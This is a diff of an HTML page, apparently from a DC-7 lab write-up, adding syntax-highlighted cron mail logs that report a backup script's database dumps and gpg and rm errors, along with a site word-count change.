+        <span class="token keyword">for</span> root@dc-7<span class="token punctuation">;</span> Thu, 29 Aug 2019 17:45:11 +1000
+From: root@dc-7 <span class="token punctuation">(</span>Cron Daemon<span class="token punctuation">)</span>
+To: root@dc-7
+Subject: Cron <span class="token operator">&lt;</span>root@dc-7<span class="token operator">></span> /opt/scripts/backups.sh
+MIME-Version: 1.0
+Content-Type: text/plain<span class="token punctuation">;</span> charset<span class="token operator">=</span>UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: <span class="token operator">&lt;</span>PATH<span class="token operator">=</span>/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin<span class="token operator">></span>
+X-Cron-Env: <span class="token operator">&lt;</span>SHELL<span class="token operator">=</span>/bin/sh<span class="token operator">></span>
+X-Cron-Env: <span class="token operator">&lt;</span>HOME<span class="token operator">=</span>/root<span class="token operator">></span>
+X-Cron-Env: <span class="token operator">&lt;</span>LOGNAME<span class="token operator">=</span>root<span class="token operator">></span>
+Message-Id: <span class="token operator">&lt;</span>E1i3F7H-0000G3-Nb@dc-7<span class="token operator">></span>
+Date: Thu, 29 Aug 2019 17:45:11 +1000
+
+Database dump saved to /home/dc7user/backups/website.sql               <span class="token punctuation">[</span>success<span class="token punctuation">]</span>
+gpg: symmetric encryption of <span class="token string">'/home/dc7user/backups/website.tar.gz'</span> failed: File exists
+gpg: symmetric encryption of <span class="token string">'/home/dc7user/backups/website.sql'</span> failed: File exists
+
+From root@dc-7 Thu Aug 29 20:45:21 2019
+Return-path: <span class="token operator">&lt;</span>root@dc-7<span class="token operator">></span>
+Envelope-to: root@dc-7
+Delivery-date: Thu, 29 Aug 2019 20:45:21 +1000
+Received: from root by dc-7 with local <span class="token punctuation">(</span>Exim 4.89<span class="token punctuation">)</span>
+        <span class="token punctuation">(</span>envelope-from <span class="token operator">&lt;</span>root@dc-7<span class="token operator">></span><span class="token punctuation">)</span>
+        <span class="token function">id</span> 1i3Hvd-0000ED-CP
+        <span class="token keyword">for</span> root@dc-7<span class="token punctuation">;</span> Thu, 29 Aug 2019 20:45:21 +1000
+From: root@dc-7 <span class="token punctuation">(</span>Cron Daemon<span class="token punctuation">)</span>
+To: root@dc-7
+Subject: Cron <span class="token operator">&lt;</span>root@dc-7<span class="token operator">></span> /opt/scripts/backups.sh
+MIME-Version: 1.0
+Content-Type: text/plain<span class="token punctuation">;</span> charset<span class="token operator">=</span>UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: <span class="token operator">&lt;</span>PATH<span class="token operator">=</span>/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin<span class="token operator">></span>
+X-Cron-Env: <span class="token operator">&lt;</span>SHELL<span class="token operator">=</span>/bin/sh<span class="token operator">></span>
+X-Cron-Env: <span class="token operator">&lt;</span>HOME<span class="token operator">=</span>/root<span class="token operator">></span>
+X-Cron-Env: <span class="token operator">&lt;</span>LOGNAME<span class="token operator">=</span>root<span class="token operator">></span>
+Message-Id: <span class="token operator">&lt;</span>E1i3Hvd-0000ED-CP@dc-7<span class="token operator">></span>
+Date: Thu, 29 Aug 2019 20:45:21 +1000
+
+Database dump saved to /home/dc7user/backups/website.sql               <span class="token punctuation">[</span>success<span class="token punctuation">]</span>
+gpg: symmetric encryption of <span class="token string">'/home/dc7user/backups/website.tar.gz'</span> failed: File exists
+gpg: symmetric encryption of <span class="token string">'/home/dc7user/backups/website.sql'</span> failed: File exists
+
+From root@dc-7 Thu Aug 29 22:45:17 2019
+Return-path: <span class="token operator">&lt;</span>root@dc-7<span class="token operator">></span>
+Envelope-to: root@dc-7
+Delivery-date: Thu, 29 Aug 2019 22:45:17 +1000
+Received: from root by dc-7 with local <span class="token punctuation">(</span>Exim 4.89<span class="token punctuation">)</span>
+        <span class="token punctuation">(</span>envelope-from <span class="token operator">&lt;</span>root@dc-7<span class="token operator">></span><span class="token punctuation">)</span>
+        <span class="token function">id</span> 1i3Jng-0000Iw-Rq
+        <span class="token keyword">for</span> root@dc-7<span class="token punctuation">;</span> Thu, 29 Aug 2019 22:45:16 +1000
+From: root@dc-7 <span class="token punctuation">(</span>Cron Daemon<span class="token punctuation">)</span>
+To: root@dc-7
+Subject: Cron <span class="token operator">&lt;</span>root@dc-7<span class="token operator">></span> /opt/scripts/backups.sh
+MIME-Version: 1.0
+Content-Type: text/plain<span class="token punctuation">;</span> charset<span class="token operator">=</span>UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: <span class="token operator">&lt;</span>PATH<span class="token operator">=</span>/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin<span class="token operator">></span>
+X-Cron-Env: <span class="token operator">&lt;</span>SHELL<span class="token operator">=</span>/bin/sh<span class="token operator">></span>
+X-Cron-Env: <span class="token operator">&lt;</span>HOME<span class="token operator">=</span>/root<span class="token operator">></span>
+X-Cron-Env: <span class="token operator">&lt;</span>LOGNAME<span class="token operator">=</span>root<span class="token operator">></span>
+Message-Id: <span class="token operator">&lt;</span>E1i3Jng-0000Iw-Rq@dc-7<span class="token operator">></span>
+Date: Thu, 29 Aug 2019 22:45:16 +1000
+
+Database dump saved to /home/dc7user/backups/website.sql               <span class="token punctuation">[</span>success<span class="token punctuation">]</span>
+
+From root@dc-7 Thu Aug 29 23:00:12 2019
+Return-path: <span class="token operator">&lt;</span>root@dc-7<span class="token operator">></span>
+Envelope-to: root@dc-7
+Delivery-date: Thu, 29 Aug 2019 23:00:12 +1000
+Received: from root by dc-7 with local <span class="token punctuation">(</span>Exim 4.89<span class="token punctuation">)</span>
+        <span class="token punctuation">(</span>envelope-from <span class="token operator">&lt;</span>root@dc-7<span class="token operator">></span><span class="token punctuation">)</span>
+        <span class="token function">id</span> 1i3K28-0000Ll-11
+        <span class="token keyword">for</span> root@dc-7<span class="token punctuation">;</span> Thu, 29 Aug 2019 23:00:12 +1000
+From: root@dc-7 <span class="token punctuation">(</span>Cron Daemon<span class="token punctuation">)</span>
+To: root@dc-7
+Subject: Cron <span class="token operator">&lt;</span>root@dc-7<span class="token operator">></span> /opt/scripts/backups.sh
+MIME-Version: 1.0
+Content-Type: text/plain<span class="token punctuation">;</span> charset<span class="token operator">=</span>UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: <span class="token operator">&lt;</span>PATH<span class="token operator">=</span>/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin<span class="token operator">></span>
+X-Cron-Env: <span class="token operator">&lt;</span>SHELL<span class="token operator">=</span>/bin/sh<span class="token operator">></span>
+X-Cron-Env: <span class="token operator">&lt;</span>HOME<span class="token operator">=</span>/root<span class="token operator">></span>
+X-Cron-Env: <span class="token operator">&lt;</span>LOGNAME<span class="token operator">=</span>root<span class="token operator">></span>
+Message-Id: <span class="token operator">&lt;</span>E1i3K28-0000Ll-11@dc-7<span class="token operator">></span>
+Date: Thu, 29 Aug 2019 23:00:12 +1000
+
+Database dump saved to /home/dc7user/backups/website.sql               <span class="token punctuation">[</span>success<span class="token punctuation">]</span>
+
+From root@dc-7 Fri Aug 30 00:15:18 2019
+Return-path: <span class="token operator">&lt;</span>root@dc-7<span class="token operator">></span>
+Envelope-to: root@dc-7
+Delivery-date: Fri, 30 Aug 2019 00:15:18 +1000
+Received: from root by dc-7 with local <span class="token punctuation">(</span>Exim 4.89<span class="token punctuation">)</span>
+        <span class="token punctuation">(</span>envelope-from <span class="token operator">&lt;</span>root@dc-7<span class="token operator">></span><span class="token punctuation">)</span>
+        <span class="token function">id</span> 1i3LCo-0000Eb-02
+        <span class="token keyword">for</span> root@dc-7<span class="token punctuation">;</span> Fri, 30 Aug 2019 00:15:18 +1000
+From: root@dc-7 <span class="token punctuation">(</span>Cron Daemon<span class="token punctuation">)</span>
+To: root@dc-7
+Subject: Cron <span class="token operator">&lt;</span>root@dc-7<span class="token operator">></span> /opt/scripts/backups.sh
+MIME-Version: 1.0
+Content-Type: text/plain<span class="token punctuation">;</span> charset<span class="token operator">=</span>UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: <span class="token operator">&lt;</span>PATH<span class="token operator">=</span>/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin<span class="token operator">></span>
+X-Cron-Env: <span class="token operator">&lt;</span>SHELL<span class="token operator">=</span>/bin/sh<span class="token operator">></span>
+X-Cron-Env: <span class="token operator">&lt;</span>HOME<span class="token operator">=</span>/root<span class="token operator">></span>
+X-Cron-Env: <span class="token operator">&lt;</span>LOGNAME<span class="token operator">=</span>root<span class="token operator">></span>
+Message-Id: <span class="token operator">&lt;</span>E1i3LCo-0000Eb-02@dc-7<span class="token operator">></span>
+Date: Fri, 30 Aug 2019 00:15:18 +1000
+
+rm: cannot remove <span class="token string">'/home/dc7user/backups/*'</span><span class="token keyword">:</span> No such <span class="token function">file</span> or directory
+Database dump saved to /home/dc7user/backups/website.sql               <span class="token punctuation">[</span>success<span class="token punctuation">]</span>
+
+From root@dc-7 Fri Aug 30 03:15:17 2019
+Return-path: <span class="token operator">&lt;</span>root@dc-7<span class="token operator">></span>
+Envelope-to: root@dc-7
+Delivery-date: Fri, 30 Aug 2019 03:15:17 +1000
+Received: from root by dc-7 with local <span class="token punctuation">(</span>Exim 4.89<span class="token punctuation">)</span>
+        <span class="token punctuation">(</span>envelope-from <span class="token operator">&lt;</span>root@dc-7<span class="token operator">></span><span class="token punctuation">)</span>
+        <span class="token function">id</span> 1i3O0y-0000Ed-To
+        <span class="token keyword">for</span> root@dc-7<span class="token punctuation">;</span> Fri, 30 Aug 2019 03:15:17 +1000
+From: root@dc-7 <span class="token punctuation">(</span>Cron Daemon<span class="token punctuation">)</span>
+To: root@dc-7
+Subject: Cron <span class="token operator">&lt;</span>root@dc-7<span class="token operator">></span> /opt/scripts/backups.sh
+MIME-Version: 1.0
+Content-Type: text/plain<span class="token punctuation">;</span> charset<span class="token operator">=</span>UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: <span class="token operator">&lt;</span>PATH<span class="token operator">=</span>/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin<span class="token operator">></span>
+X-Cron-Env: <span class="token operator">&lt;</span>SHELL<span class="token operator">=</span>/bin/sh<span class="token operator">></span>
+X-Cron-Env: <span class="token operator">&lt;</span>HOME<span class="token operator">=</span>/root<span class="token operator">></span>
+X-Cron-Env: <span class="token operator">&lt;</span>LOGNAME<span class="token operator">=</span>root<span class="token operator">></span>
+Message-Id: <span class="token operator">&lt;</span>E1i3O0y-0000Ed-To@dc-7<span class="token operator">></span>
+Date: Fri, 30 Aug 2019 03:15:17 +1000
+
+rm: cannot remove <span class="token string">'/home/dc7user/backups/*'</span><span class="token keyword">:</span> No such <span class="token function">file</span> or directory
+Database dump saved to /home/dc7user/backups/website.sql               <span class="token punctuation">[</span>success<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
             </div>
             <hr/>
 
@@ -1148,7 +1589,7 @@ Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linu
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">38.6k</span>&nbsp;字
+                class="white-color">43.3k</span>&nbsp;字
             
             
             
